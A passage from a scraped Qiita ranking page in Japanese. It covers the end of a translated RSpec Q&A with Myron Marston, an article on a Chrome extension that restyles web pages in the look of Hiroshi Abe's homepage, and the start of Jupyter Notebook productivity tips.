  <span class="n">it</span> <span class="s1">'makes hay for horses'</span> <span class="k">do</span>
    <span class="n">factory</span> <span class="o">=</span> <span class="no">FoodFactory</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="ss">:horse</span><span class="p">)</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">factory</span><span class="o">.</span><span class="n">make_food</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">eq</span><span class="p">(</span><span class="ss">:hay</span><span class="p">)</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></div></div>

<p>もうひとつは「複雑な」スタイルです。こちらはRSpecの機能をたくさん使います（<code>context</code>、<code>subject</code>、<code>is_expected</code>、等）。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="no">RSpec</span><span class="o">.</span><span class="n">describe</span> <span class="no">FoodFactory</span><span class="p">,</span> <span class="s1">'#make_food'</span> <span class="k">do</span>
  <span class="n">subject</span> <span class="p">{</span> <span class="n">factory</span><span class="o">.</span><span class="n">make_food</span> <span class="p">}</span>
  <span class="n">let</span><span class="p">(</span><span class="ss">:factory</span><span class="p">)</span> <span class="p">{</span> <span class="no">FoodFactory</span><span class="o">.</span><span class="n">for</span><span class="p">(</span><span class="n">animals</span><span class="p">)</span> <span class="p">}</span>

  <span class="n">context</span> <span class="s1">'for monkeys'</span> <span class="k">do</span>
    <span class="n">let</span><span class="p">(</span><span class="ss">:animals</span><span class="p">)</span> <span class="p">{</span> <span class="ss">:monkeys</span> <span class="p">}</span>
    <span class="n">it</span> <span class="p">{</span> <span class="n">is_expected</span><span class="o">.</span><span class="n">to</span> <span class="n">eq</span><span class="p">(</span><span class="ss">:banana</span><span class="p">)</span> <span class="p">}</span>
  <span class="k">end</span>

  <span class="n">context</span> <span class="s1">'for horses'</span> <span class="k">do</span>
    <span class="n">let</span><span class="p">(</span><span class="ss">:animals</span><span class="p">)</span> <span class="p">{</span> <span class="ss">:horses</span> <span class="p">}</span>
    <span class="n">it</span> <span class="p">{</span> <span class="n">is_expected</span><span class="o">.</span><span class="n">to</span> <span class="n">eq</span><span class="p">(</span><span class="ss">:hay</span><span class="p">)</span> <span class="p">}</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></div></div>

<p>あなたはどちらかひとつを選びますか？それとも両方をおすすめしますか？その理由は何ですか？</p>

<h2>
<span id="a-絶対にシンプルな方です" class="fragment"></span><a href="#a-%E7%B5%B6%E5%AF%BE%E3%81%AB%E3%82%B7%E3%83%B3%E3%83%97%E3%83%AB%E3%81%AA%E6%96%B9%E3%81%A7%E3%81%99"><i class="fa fa-link"></i></a>A. 絶対にシンプルな方です</h2>

<p>私が確実に好きなのは、そして絶対におすすめするのは、あなたが最初に提示したシンプルなスタイルの方です。</p>

<p><code>subject</code>や<code>is_expected</code>といった機能には適切なユースケースがあります。しかし、残念ながらユーザーの中にはそれが「RSpecらしいスタイル」と考えて、すべてのspecをそういう書き方にしようとします。</p>

<p>あなたが書いてくれた複雑なスタイルの方は、RSpecの正しい理解が必要になりますし、制御フローもあっちこっちに飛びます。シンプルなスタイルはコード量も少なく、何よりずっと単純です。</p>

<p>specファイルが大きくなるにつれて、複雑なスタイルはだんだんと付き合っていくのが困難になります。あるexampleとそれが依存するいくつかの宣言文（例：<code>subject</code>や<code>let(:factory)</code>）の距離はどんどん離れていくでしょう。</p>

<p>加えて、ドキュメント文字列を手書きするのではなく、RSpecに出力させている場合は、ドキュメント文字列を使って（<code>--example</code>を使って）exampleをフィルタリングできなくなります。なぜならRSpecはそのexampleを実行するときにドキュメント文字列を生成するからです。なので、実行前にフィルタリングすることはできません。</p>

<p>この点については書籍「<a href="https://pragprog.com/book/rspec3/effective-testing-with-rspec-3" rel="nofollow noopener" target="_blank">Effective Testing with RSpec 3</a>」の中でもいくつかの場所で議論しています。</p>

<hr>

<h2>
<span id="q-rspecのdslは全員覚えるべき" class="fragment"></span><a href="#q-rspec%E3%81%AEdsl%E3%81%AF%E5%85%A8%E5%93%A1%E8%A6%9A%E3%81%88%E3%82%8B%E3%81%B9%E3%81%8D"><i class="fa fa-link"></i></a>Q. RSpecのDSLは全員覚えるべき？</h2>

<p>あなたはRSpecが複雑だと思いますか？そして人々はテストにフォーカスする代わりに、RSpecのDSLを学ぶ必要があると思いますか？</p>

<h2>
<span id="a-必ずしもrspecを選ぶ必要はありません" class="fragment"></span><a href="#a-%E5%BF%85%E3%81%9A%E3%81%97%E3%82%82rspec%E3%82%92%E9%81%B8%E3%81%B6%E5%BF%85%E8%A6%81%E3%81%AF%E3%81%82%E3%82%8A%E3%81%BE%E3%81%9B%E3%82%93"><i class="fa fa-link"></i></a>A. 必ずしもRSpecを選ぶ必要はありません</h2>

<p>はい、RSpecは間違いなく複雑です。テストをするためのもっとシンプルな方法は他に存在します。</p>

<p>いいえ、テストをうまくやるためにRSpecを学ぶ必要はありません。Minitestのようなシンプルなテストライブラリを使うことはまったく問題ありません。</p>

<p>RSpecはとても魅力的な機能をたくさん持っていると私は考えています。そうした機能はテストによって開発を加速させたいと考える開発者にとって、たいへん便利なものです。ただし、学習曲線は確実に存在します。</p>

<p>Minitestを使った方がいいケースは確実にあります。たとえば、もし締め切りが厳しく、チームメンバーが他の言語でxUnit系のフレームワークを使い慣れており、RSpecを一度も使ったことがないのであれば、私は絶対そのチームにRSpecよりもMinitestを使うことをおすすめします。</p>

<hr>

<h2>
<span id="q-rspecとminitestをどう比較する" class="fragment"></span><a href="#q-rspec%E3%81%A8minitest%E3%82%92%E3%81%A9%E3%81%86%E6%AF%94%E8%BC%83%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>Q. RSpecとMinitestをどう比較する？</h2>

<p>あなたはRSpecとMinitestをどのように比較していますか？</p>

<h2>
<span id="a-どっちも便利哲学が異なるので対立させるべきでない" class="fragment"></span><a href="#a-%E3%81%A9%E3%81%A3%E3%81%A1%E3%82%82%E4%BE%BF%E5%88%A9%E5%93%B2%E5%AD%A6%E3%81%8C%E7%95%B0%E3%81%AA%E3%82%8B%E3%81%AE%E3%81%A7%E5%AF%BE%E7%AB%8B%E3%81%95%E3%81%9B%E3%82%8B%E3%81%B9%E3%81%8D%E3%81%A7%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>A. どっちも便利。哲学が異なるので対立させるべきでない</h2>

<p>どちらもとても便利です。開発の生産性が向上するなら、どちらを使っても構いません。</p>

<p>ですが、2つのライブラリは異なる哲学を持っています。Minitestは「ミニ」であることに焦点を置いており、それはそれで成功しています。小さくてシンプルなテスティングフレームワークになっていることは、本当に素晴らしいことです。フレームワーク本体のコードだって一気に読み上げることができます。</p>

<p>私は過去にMinitestを使ったときにMinitestに不足していてときどき不満に思った機能を、RSpecに実装し、RSpecを便利にしています。</p>

<p>RSpecでは第一級クラスによる抽象化も提供しています。これは複雑さを増す原因になりますが、一方で柔軟性も提供してくれます。</p>

<p>たとえば、<code>example</code>は（単なるメソッドではなく）オブジェクトであり、メタデータを追加できます。そのため、設定ファイルを通じてフィルタリングや挙動の変更を行うことができます。エクスペクテーションは（検証メソッドの代わりに）マッチャオブジェクトを利用します。このオブジェクトはコンポーザブル（組み合わせ可能）です。</p>

<p>ですが私は、Minitestの開発者にはRSpecをMinitestに対立するものとして議論の対象にしてほしくありません。私は2つのフレームワークをRailsとSinatraのようなものだと考えています。RailsとSinatraはどちらも便利ですし、それぞれに有益な利用シーンがあります。この2つを対立するフレームワークと見なす必要はないのです。</p>

<hr>

<h2>
<span id="q-追加して後悔している機能は何" class="fragment"></span><a href="#q-%E8%BF%BD%E5%8A%A0%E3%81%97%E3%81%A6%E5%BE%8C%E6%82%94%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E6%A9%9F%E8%83%BD%E3%81%AF%E4%BD%95"><i class="fa fa-link"></i></a>Q. 追加して後悔している機能は何？</h2>

<p>RSpec 3でなくした機能以外で、追加して後悔している機能は何ですか？また、それはなぜですか？</p>

<h2>
<span id="a-any_instanceワンライナー構文beforeallcontextです" class="fragment"></span><a href="#a-any_instance%E3%83%AF%E3%83%B3%E3%83%A9%E3%82%A4%E3%83%8A%E3%83%BC%E6%A7%8B%E6%96%87beforeallcontext%E3%81%A7%E3%81%99"><i class="fa fa-link"></i></a>A. any_instance、ワンライナー構文、before(:all/:context)です</h2>

<p>私が考える主な機能は以下のとおりです。</p>

<h3>
<span id="any_instanceを使ったモックとスタブ" class="fragment"></span><a href="#any_instance%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%9F%E3%83%A2%E3%83%83%E3%82%AF%E3%81%A8%E3%82%B9%E3%82%BF%E3%83%96"><i class="fa fa-link"></i></a><code>any_instance</code>を使ったモックとスタブ</h3>

<p>この機能をサポートするためのコードは極めて複雑で、必ずしもRubyの全機能とうまく協調しません（たとえば、スタブ化されたメソッドがprependされたモジュールの中で定義されている場合はうまく動きません）。</p>

<p>加えて、これを使うとテスト対象のコードが内部でやりとりしている複雑性を隠してしまいますし、RSpecの機能がユーザーに対して設計上の問題点を回避するのを促すことになってしまいます。これを使ってもコードの設計は改善しないのです。</p>

<h3>
<span id="ワンライナー構文例it--is_expectedto-blah--や-it--should-blah-" class="fragment"></span><a href="#%E3%83%AF%E3%83%B3%E3%83%A9%E3%82%A4%E3%83%8A%E3%83%BC%E6%A7%8B%E6%96%87%E4%BE%8Bit--is_expectedto-blah--%E3%82%84-it--should-blah-"><i class="fa fa-link"></i></a>ワンライナー構文（例：<code>it { is_expected.to blah }</code> や <code>it { should blah }</code>）</h3>

<p>この機能は機会と場所を選びます（たとえば、<a href="https://github.com/sinatra/mustermann/blob/v1.0.1/mustermann/spec/sinatra_spec.rb" rel="nofollow noopener" target="_blank">mustermannのspec</a>にはピッタリです）。ですが、この機能はRSpecのユーザーを不幸な方向へ導いてしまいます。</p>

<p>何年にもわたって、私たちは数多くの質問やリクエストを受けています。それらはRSpecのDSLに機能を追加して、ワンライナー構文でもっと複雑なことをできるようにしたい、というものです。ですが、大半のケースでは単に<code>describe</code>と<code>it</code>を使う方がよいと私は考えています。</p>

<p>そして、できれば<code>subject</code>やワンライナー構文のサポートは、恩恵を受けることができる数少ないプロジェクトのために拡張gemにしたいと考えています。</p>

<h3>
<span id="beforeallとbeforecontext" class="fragment"></span><a href="#beforeall%E3%81%A8beforecontext"><i class="fa fa-link"></i></a><code>before(:all)</code>と<code>before(:context)</code>
</h3>

<p>この機能は理論上はすばらしく、とてもシンプルに見えますが、実際には問題を引き起こす原因になりがちです。なぜなら、RSpecとその周辺のエコシステムではexampleごとのライフサイクルを想定しているものが多いからです。</p>

<p>たとえば、exampleごとにDBのトランザクションをラップし（大半のプロジェクトがそうしているでしょう）、<code>before(:cotext)</code>フックを使ってDBレコードをいくつか作成すると、トランザクションの外部でレコードを作ったことになり、データが残ってしまって他のexampleが失敗する原因になります。</p>

<p>もし実行速度が気になっていて、一度の実行で一気にたくさんのアサーションを実行したいと考えているのであれば、<code>aggregate_failures</code>を使う方がいいでしょう。</p>

<hr>

<h2>
<span id="q-power-assertってどう思う" class="fragment"></span><a href="#q-power-assert%E3%81%A3%E3%81%A6%E3%81%A9%E3%81%86%E6%80%9D%E3%81%86"><i class="fa fa-link"></i></a>Q. power-assertってどう思う？</h2>

<p>power-assertについてはどう考えていますか？</p>

<h2>
<span id="a-便利そうelixirのexunitはとても良かった" class="fragment"></span><a href="#a-%E4%BE%BF%E5%88%A9%E3%81%9D%E3%81%86elixir%E3%81%AEexunit%E3%81%AF%E3%81%A8%E3%81%A6%E3%82%82%E8%89%AF%E3%81%8B%E3%81%A3%E3%81%9F"><i class="fa fa-link"></i></a>A. 便利そう。ElixirのExUnitはとても良かった</h2>

<p>あなたが言っているのは<a href="https://github.com/k-tsj/power_assert" rel="nofollow noopener" target="_blank">このライブラリ</a>（訳注：<a href="https://github.com/k-tsj/power_assert" rel="nofollow noopener" target="_blank">https://github.com/k-tsj/power_assert</a>）ですか？<br>
使ったことはありませんが、便利そうですね。</p>

<p>私は最近ちょっとだけElixirを使ったんですが、ExUnitは同じようなアプローチをとっていました。<br>
<code>assert</code>はマクロになっていて、渡された式のAST(抽象構文木)を受け取ります。さらにそれを分割し、異なる部分を評価し、とても役立つ失敗メッセージを提供します。個別の検証メソッドやマッチャは必要ありません。<br>
あれはとても良かったですね。</p>

<p>検証APIが小さくなればなるほど、人々はテストを簡単に始めることができます。<br>
これはとても素晴らしいことです。</p>

<hr>

<h2>
<span id="q-rspecで今後チャレンジしたいことは" class="fragment"></span><a href="#q-rspec%E3%81%A7%E4%BB%8A%E5%BE%8C%E3%83%81%E3%83%A3%E3%83%AC%E3%83%B3%E3%82%B8%E3%81%97%E3%81%9F%E3%81%84%E3%81%93%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>Q. RSpecで今後チャレンジしたいことは？</h2>

<p>RSpecで今後やってみたい大きなチャレンジは何かありますか？</p>

<h2>
<span id="a-やれることはやりきったapiの大きな変更もないだろう" class="fragment"></span><a href="#a-%E3%82%84%E3%82%8C%E3%82%8B%E3%81%93%E3%81%A8%E3%81%AF%E3%82%84%E3%82%8A%E3%81%8D%E3%81%A3%E3%81%9Fapi%E3%81%AE%E5%A4%A7%E3%81%8D%E3%81%AA%E5%A4%89%E6%9B%B4%E3%82%82%E3%81%AA%E3%81%84%E3%81%A0%E3%82%8D%E3%81%86"><i class="fa fa-link"></i></a>A. やれることはやりきった。APIの大きな変更もないだろう</h2>

<p>私が考えている大きなチャレンジというのは特にありません。その理由の一つは、私がRSpecのことをほとんど「やりきった」と考えているからです。</p>

<p>RSpecは引き続きサポートされ、改善されますが、APIの大きな変更はもうないと思います。<br>
RSpecの機能はすでに十分豊富です。<br>
正直なところ、次のメジャーリリースで魅力的かつ大きな新機能を提供するのは難しいだろうと考えています。</p>

<p>(翻訳ここまで)</p>

<h2>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h2>

<p>というわけで、この記事ではRedditに載っていたRSpecに関するQ&amp;A企画を翻訳してみました。</p>

<p>Myron Marston氏が<code>subject</code>やワンライナー構文の追加を後悔していたり、これ以上のAPIの大きな変更は考えていなかったりする点が個人的にはすごく興味深かったです。</p>

<p>こうした筆者の考えやアドバイスはみなさんがRSpecを書くときに役立つ物も多いと思うので、ぜひ参考にしてみてください。</p>

<h3>
<span id="あわせて読みたい" class="fragment"></span><a href="#%E3%81%82%E3%82%8F%E3%81%9B%E3%81%A6%E8%AA%AD%E3%81%BF%E3%81%9F%E3%81%84"><i class="fa fa-link"></i></a>あわせて読みたい</h3>

<p><a href="http://blog.jnito.com/entry/2017/09/11/051550" rel="nofollow noopener" target="_blank">【書評】RSpecの初心者から上級者まで役立つ！「Effective Testing with RSpec 3」を読みました - give IT a try</a></p>

<p>このQ&amp;A企画の元になっている書籍「Effective Testing with RSpec 3」を読んだ感想をまとめています。<br>
今年出版されたばかりの洋書ですが、RSpecを書くときに参考になる考え方がたくさん載っていました。</p>

<p><a href="https://qiita.com/jnchito/items/91779b55cae0f4915da5" id="reference-047f8f530fb13572c55f">【アンチパターン】Arrange、Act、Assert（AAA）を意識できていないRSpecのコード例とその対処法 - Qiita</a></p>

<p>Q&amp;Aの中でMyron Marston氏も「ワンライナー構文は濫用すべきでない」と語っていましたが、この点は僕も同意見です。<br>
このQiita記事の中では僕も同じようなことを書いています。</p>

<p><a href="https://qiita.com/jnchito/items/a90b3b09d008227d3d60" id="reference-5e4bdafaa2779b84063e">サヨナラBetter Specs!? 雑で気楽なRSpecのススメ - Qiita</a></p>

<p>複雑なスタイルよりもシンプルなスタイルの方が良い、というのもやはり同意見です。<br>
僕も最近は複雑なスタイルを避けるようにしています。<br>
このQiita記事では具体的なコード例を挙げて、複雑なスタイルとシンプルなスタイル（雑なスタイル）をメリット・デメリット比較しています。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">66位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>160</kbd>
		<a target="_blank" href="https://qiita.com/kyoyababa/items/b7e80ac4815bcb95a49a">いまみているウェブページを阿部寛のサイトっぽくするChrome拡張を作った</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-20<br />11:19:24</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/105252.html">kyoyababa</a>(13件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/105252/profile-images/1473709559">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[chrome-extension]</b> <b>[阿部寛]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p><em>日本を代表するすばらしい俳優であり, ブルータルウェブレイアウトの先駆者である阿部寛氏と彼のウェブサイト制作者への敬意をこめて.</em></p>

<h1>
<span id="成果物" class="fragment"></span><a href="#%E6%88%90%E6%9E%9C%E7%89%A9"><i class="fa fa-link"></i></a>成果物</h1>

<p><a href="https://chrome.google.com/webstore/detail/abehiroshize/okffapkklocfabdipcgpaiibomcjdopp" class="autolink" rel="nofollow noopener" target="_blank">https://chrome.google.com/webstore/detail/abehiroshize/okffapkklocfabdipcgpaiibomcjdopp</a></p>

<p>左が通常のWikipedia、右がこの拡張機能でAbehiroshize（アベヒロシャイズ）したページ.</p>

<p><a href="https://camo.qiitausercontent.com/52a5ebe4f4fc8fae44720332c99dc081c19ff83d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353235322f34363438636466642d663361392d643430612d646236632d6539333931653639663736302e706e67" target="_blank" rel="nofollow noopener"><img width="641" alt="Screen Shot 2017-11-20 at 11.08.50.png" src="https://camo.qiitausercontent.com/52a5ebe4f4fc8fae44720332c99dc081c19ff83d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353235322f34363438636466642d663361392d643430612d646236632d6539333931653639663736302e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/105252/4648cdfd-f3a9-d40a-db6c-e9391e69f760.png"></a></p>

<p><a href="https://github.com/kyoyababa/abehiroshize" rel="nofollow noopener" target="_blank">Githubレポジトリ</a></p>

<h1>
<span id="技術仕様" class="fragment"></span><a href="#%E6%8A%80%E8%A1%93%E4%BB%95%E6%A7%98"><i class="fa fa-link"></i></a>技術仕様</h1>

<h2>
<span id="dom操作" class="fragment"></span><a href="#dom%E6%93%8D%E4%BD%9C"><i class="fa fa-link"></i></a>DOM操作</h2>

<p>基本的にjQueryでDOM操作しまくっているだけである.</p>

<h2>
<span id="左ナビゲーション判定" class="fragment"></span><a href="#%E5%B7%A6%E3%83%8A%E3%83%93%E3%82%B2%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E5%88%A4%E5%AE%9A"><i class="fa fa-link"></i></a>左ナビゲーション判定</h2>

<ul>
<li>ナビゲーションの判定について、 <code>$('nav')</code> や <code>$('#menu')</code> などをもとに判定して左側に表示しようと思っていたが、意外と世の中のサイトはマークアップが適当なものが多く、うまくいかなかったので <strong><code>&lt;ul&gt;</code>だったらナビゲーションにする</strong> という強硬手段に出た. ただし、<code>&lt;main&gt;</code>タグ内にあるそれは除く.</li>
</ul>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span><span class="nx">$</span><span class="p">(</span><span class="s1">'ul'</span><span class="p">).</span><span class="nx">each</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">closest</span><span class="p">(</span><span class="s1">'main'</span><span class="p">).</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="s1">'li'</span><span class="p">).</span><span class="nx">appendTo</span><span class="p">(</span><span class="sb">`#</span><span class="si">${</span><span class="nx">navigationInnerListId</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">});</span>
</pre></div></div>

<h2>
<span id="既存スタイルの削除" class="fragment"></span><a href="#%E6%97%A2%E5%AD%98%E3%82%B9%E3%82%BF%E3%82%A4%E3%83%AB%E3%81%AE%E5%89%8A%E9%99%A4"><i class="fa fa-link"></i></a>既存スタイルの削除</h2>

<p>雑だが強制的にデフォルトスタイルを全部排除する. リセットすらしない.</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">removeExistingStyles</span><span class="p">()</span> <span class="p">{</span>
  <span class="kr">const</span> <span class="nx">$styleElements</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">'style'</span><span class="p">);</span>
  <span class="kr">const</span> <span class="nx">$stylesheetElements</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">'link[rel="stylesheet"]'</span><span class="p">);</span>
  <span class="kr">const</span> <span class="nx">$cssElements</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">'link[type="text/css"]'</span><span class="p">)</span>

  <span class="nx">$styleElements</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
  <span class="nx">$stylesheetElements</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
  <span class="nx">$cssElements</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
  <span class="nx">$</span><span class="p">(</span><span class="s1">'*'</span><span class="p">).</span><span class="nx">removeAttr</span><span class="p">(</span><span class="s1">'style'</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="背景の文字" class="fragment"></span><a href="#%E8%83%8C%E6%99%AF%E3%81%AE%E6%96%87%E5%AD%97"><i class="fa fa-link"></i></a>背景の文字</h2>

<p>CSSのbefore擬似要素に対して、<code>&lt;title&gt;</code>の文字列テキストを羅列させた.</p>

<div class="code-frame" data-lang="css"><div class="highlight"><pre><span></span><span class="err">#</span><span class="o">$</span><span class="p">{</span><span class="err">contentId</span><span class="p">}:</span><span class="nd">before</span> <span class="p">{</span>
  <span class="k">content</span><span class="p">:</span> <span class="s1">'${documentTitle}　　${documentTitle}　　${documentTitle}　　...　　${documentTitle}'</span><span class="p">;</span>
  <span class="k">z-index</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">font-size</span><span class="p">:</span> <span class="mi">70</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">font-family</span><span class="p">:</span> <span class="s1">'Pinyon Script'</span><span class="p">,</span> <span class="kc">cursive</span><span class="p">;</span>
  <span class="k">word-break</span><span class="p">:</span> <span class="n">break-all</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#D3F6E0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<h1>
<span id="参考" class="fragment"></span><a href="#%E5%8F%82%E8%80%83"><i class="fa fa-link"></i></a>参考</h1>

<ul>
<li><a href="http://abehiroshi.la.coocan.jp/" rel="nofollow noopener" target="_blank">阿部 寛のホームページ</a></li>
<li><a href="https://qiita.com/thr3a/items/702e58f5d793332a1001" id="reference-dd41b071500db91cef73">爆速でChrome拡張機能を作成する</a></li>
<li><a href="https://qiita.com/sqrtxx/items/19fd2114430e9e1fb57f" id="reference-e7752a4407fb2bc5d3c4">Chrome Extension を作って公開する</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">67位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>160</kbd>
		<a target="_blank" href="https://qiita.com/ishizakiiii/items/b98bbf8997f039f40058">Jupyter Notebookをより便利に使うために、色々まとめ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-22<br />00:05:43</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/105335.html">ishizakiiii</a>(5件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/105335/profile-images/1483012537">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[Jupyter]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="概要" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a>概要</h1>

<p>Jupyter Notebookをより便利に使うため、整理してまとめてみました。</p>

<h1>
<span id="テーマを変える" class="fragment"></span><a href="#%E3%83%86%E3%83%BC%E3%83%9E%E3%82%92%E5%A4%89%E3%81%88%E3%82%8B"><i class="fa fa-link"></i></a>テーマを変える</h1>

<p>jupyterthemesを使うと、フォントや背景色、テーマを変えられます。<br>
Jupyterを起動する前に、コマンドで変更します。</p>

<p><a href="https://github.com/dunovank/jupyter-themes" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/dunovank/jupyter-themes</a></p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span><span class="c1"># install</span>
pip install jupyterthemes
</pre></div></div>

<p>◆ サンプル</p>

<ul>
<li>ブラック系</li>
</ul>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span><span class="c1"># dark</span>
jt -t onedork -fs <span class="m">95</span> -altp -tfs <span class="m">11</span> -nfs <span class="m">115</span> -cellw <span class="m">88</span>% -T
</pre></div></div>

<p><a href="https://camo.qiitausercontent.com/876b2e62370261b0302e7a48d85b9c187e3d6eb7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f35623164626533392d623638612d383266642d363834332d3537666134383065343465352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/876b2e62370261b0302e7a48d85b9c187e3d6eb7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f35623164626533392d623638612d383266642d363834332d3537666134383065343465352e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/105335/5b1dbe39-b68a-82fd-6843-57fa480e44e5.png"></a></p>

<ul>
<li>ホワイト系</li>
</ul>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span><span class="c1"># light</span>
jt -t grade3 -fs <span class="m">95</span> -altp -tfs <span class="m">11</span> -nfs <span class="m">115</span> -cellw <span class="m">88</span>% -T
</pre></div></div>

<p><a href="https://camo.qiitausercontent.com/a127c8743a29051ea80a4e7e4308ab53230fe415/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f34383461333935652d363832332d336134342d663236642d3164356234313737313561622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a127c8743a29051ea80a4e7e4308ab53230fe415/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130353333352f34383461333935652d363832332d336134342d663236642d3164356234313737313561622e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/105335/484a395e-6823-3a44-f26d-1d5b417715ab.png"></a></p>

<p>元に戻す</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>jt -r
</pre></div></div>

<p>他にも見栄えを変えるライブラリがありますが、個人的にはこれが一番綺麗かなと思いました。</p>

<h1>
<span id="モジュール自動リロード" class="fragment"></span><a href="#%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E8%87%AA%E5%8B%95%E3%83%AA%E3%83%AD%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>モジュール自動リロード</h1>

<p>importしている別ファイルモジュールを自動でリロードしてくれます。<br>
モジュールを変更したときに、いちいちKernel再起動しなくてもOKです。</p>

<p>別ファイルからimportしたクラスの、生成済みのインスタンスに対しても、メソッド内の変更が自動で行われるので、とても便利です。</p>

<div class="code-frame" data-lang="py3"><div class="highlight"><pre><span></span><span class="o">%</span><span class="n">reload_ext</span> <span class="n">autoreload</span>
<span class="o">%</span><span class="n">autoreload</span> <span class="mi">2</span>
</pre></div></div>

<p>参考<br>
<a href="https://qiita.com/Accent/items/f6bb4d4b7adf268662f4" id="reference-e15011b2ae71798f5687">Qiita: ipython を起動しながら自作モジュールを修正した場合</a></p>

<h1>
<span id="ショートカットキー" class="fragment"></span><a href="#%E3%82%B7%E3%83%A7%E3%83%BC%E3%83%88%E3%82%AB%E3%83%83%E3%83%88%E3%82%AD%E3%83%BC"><i class="fa fa-link"></i></a>ショートカットキー</h1>

<p><code>Esc → h</code>でショートカットキーの一覧が見れます。</p>

<p>よく使うショートカットキー</p>

<table>
<thead>
<tr>
<th style="text-align: left">Key  　　　　　</th>
<th style="text-align: left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">Esc → m</td>
<td style="text-align: left">マークダウンモードに変更</td>
</tr>
<tr>
<td style="text-align: left">Esc → y</td>
<td style="text-align: left">コードモードに変更</td>
</tr>
<tr>
